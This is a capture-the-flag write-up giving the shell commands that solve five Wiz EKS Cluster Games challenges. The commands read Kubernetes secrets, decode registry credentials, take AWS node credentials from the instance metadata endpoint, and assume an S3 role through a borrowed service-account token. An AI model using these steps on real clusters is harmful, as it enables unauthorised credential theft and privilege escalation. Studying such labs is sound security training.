# Wiz EKS Cluster Games

https://eksclustergames.com/

## Challenge 1

```shell
# Let's see who we are and what we can do
kubectl whoami
kubectl auth can-i --list
# It seems we can list and read secrets
kubectl get secrets
# The flag is hidden in one of them
kubectl get secret log-rotate -o json | jq -c -r '.data.flag' | base64 -d
```

## Challenge 2

```shell
kubectl whoami
kubectl auth can-i --list
# It seems we can read secrets but not list them
kubectl get pods
# Note: `kubectl get pod -o yaml` returns more information than `kubectl describe pod`
kubectl get pod database-pod-2c9b3a4e -o yaml
# In the description of the pod we're in, there's mention of a secret to be used to authenticate to index.docker.io
# It's a basic auth `USER:PASSWORD` credential
kubectl get secret registry-pull-secrets-780bab1d -o json | jq -r -c '.data.".dockerconfigjson"' | base64 -d | jq -r -c '.auths."index.docker.io/v1/".auth' | base64 -d
```

In another shell with docker:
```shell
docker login -u [...] -p [...]
docker run -it --rm index.docker.io/eksclustergames/base_ext_image /bin/sh
cat flag.txt
```

## Challenge 3

```shell
kubectl whoami
kubectl auth can-i --list
kubectl get pod -o yaml
# The current pod description points to ECR 688655246681.dkr.ecr.us-west-1.amazonaws.com
# Getting credentials from the IMDS metadata endpoint manually and authenticating with the node role
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/eks-challenge-cluster-nodegroup-NodeInstanceRole
export AWS_ACCESS_KEY_ID=[...]
export AWS_SECRET_ACCESS_KEY=[...]
export AWS_SESSION_TOKEN=[...]
aws sts get-caller-indentity
# Login to the ECR with the AWS IAM role, see https://docs.aws.amazon.com/AmazonECR/latest/userguide/registry_auth.html#registry-auth-token
aws ecr get-login-password --region us-west-1 | docker login --username AWS --password-stdin 688655246681.dkr.ecr.us-west-1.amazonaws.com
# Using crane to inspect the ECR
crane catalog 688655246681.dkr.ecr.us-west-1.amazonaws.com
crane ls 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c
crane digest 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c:374f28d8-container
docker pull 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c:374f28d8-container@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01
# Using https://github.com/wagoodman/dive to inspect each layer baked in the image
dive 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c:374f28d8-container@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01
```

## Challenge 4

```shell
kubectl whoami
kubectl auth can-i --list
aws sts get-caller-identity
cat ~/.kube/config
aws eks get-token --cluster-name eks-challenge-cluster --region us-west-1
export EKS_TOKEN=$(aws eks get-token --cluster-name eks-challenge-cluster --region us-west-1 | jq -r -c '.status.token')
# One can override kubectl auth config by passing `--token` explicitely
kubectl --token=${EKS_TOKEN} get secrets
kubectl --token ${EKS_TOKEN} get secret node-flag -o json | jq -r -c '.data.flag' | base64 -d
```

## Challenge 5

```shell
kubectl whoami
kubectl auth can-i --list
# We can list serviceaccounts and create tokens for one of them: debug-sa
kubectl get serviceaccounts
kubectl get serviceaccount s3access-sa -o yaml
# We're interested in assuming s3access-sa but the debug-sa serviceaccount has the same principal, so the IAM trust policy would authorize it too
kubectl create token debug-sa
export DEBUG_TOKEN=$(kubectl create token debug-sa --audience sts.amazonaws.com)
aws sts assume-role-with-web-identity --web-identity-token ${DEBUG_TOKEN} --role-arn arn:aws:iam::688655246681:role/challengeEksS3Role --role-session-name test
export AWS_ACCESS_KEY_ID=[...]
export AWS_SECRET_ACCESS_KEY=[...]
export AWS_SESSION_TOKEN=[...]
aws sts get-caller-identity
aws s3 cp s3://challenge-flag-bucket-3ff1ae2/flag .
```
